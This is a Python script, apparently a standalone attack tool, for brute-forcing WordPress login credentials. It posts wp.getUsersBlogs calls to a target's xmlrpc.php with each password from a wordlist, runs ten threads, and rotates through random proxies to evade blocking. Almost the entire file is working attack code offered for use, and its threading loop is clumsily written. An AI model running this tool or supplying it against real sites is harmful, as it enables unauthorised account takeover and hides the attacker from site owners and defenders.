
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import requests, argparse, logging, sys
from proxylist import ProxyList

parser = argparse.ArgumentParser(description="\033[1;33m[--]\033[1;m xmlrpc brute force attack")
parser.add_argument('-s', required=True, default=None, help='Target Website.')
parser.add_argument('-p', required=True, default=None, help='Password list / Path of password file.')
parser.add_argument('-u', required=True, default=None, help='Target username.')
parser.add_argument('-proxy', required=True, default=None, help='Proxy list file.')

args = vars(parser.parse_args())

if len(sys.argv) == 1:
    print("[\033[1;33m--\033[1;m] Usage: python 0xmlrpc.py -h")
    sys.exit()

host = args['s']
user = args['u']
passwordList = open(args['p'], 'r')
proxyList = args['proxy']

def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit('[!] Proxy File format has incorrect | EXIT...')
    pl.random()
    getProxy = pl.random().address()
    proxyIP = {"https": getProxy}
    try:
        checkProxyIP = requests.get("https://api.ipify.org/?format=raw", timeout=2, proxies=proxyIP)
    except:
        proxy()
    return proxyIP

def xmlrpc():
    global dead
    dead = False
    proxyIP = proxy()
    for password in passwordList:
        try:
            data = ("<methodCall><methodName>wp.getUsersBlogs</methodName><params><param>"
                    "<value>{}</value></param><param><value>{}</value>"
                    "</param></params></methodCall>".format(user, password))
            req = requests.post(args['s']+"/xmlrpc.php", data=data, proxies=proxyIP, timeout=5)
            status = req.status_code
            resp = req.text
            if 'blogName' in resp:
                sys.stdout.flush()
                sys.stdout.write('\r\033[1;32m[#] Username: {} Password Found => {}\033[1;m\t\t\t\t'.format(user, password))
                sys.stdout.flush()
                dead = True
                return dead
            else:
                if dead:
                    break
                sys.stdout.flush()
                sys.stdout.write('\r[$] Status:{} Username:{} Password:{} => \033[1;31mincorrect\033[1;m\t\t\t\t'.format(status, user, password.strip()))
                continue
        except:
            if dead:
                break
            sys.stdout.flush()
            sys.stdout.write('\r\033[1;33m[!] Status:Bad=The connection is unstable, the proxy will be changed\033[1;m\t\t\t')
            proxy()
            proxyIP = proxy()

threads = []
for i in range(10):
    threadBruteForce = threading.Thread(target=xmlrpc)
    threads.append(threadBruteForce)
    threadBruteForce.setDaemon(False)
    threadBruteForce.start()
    check = xmlrpc()
    while True:
        if check == False:
            pass
        else:
            while check:
                threadBruteForce.join()
                sys.exit(0)

if __name__ == '__main__':
    proxy()
    xmlrpc()
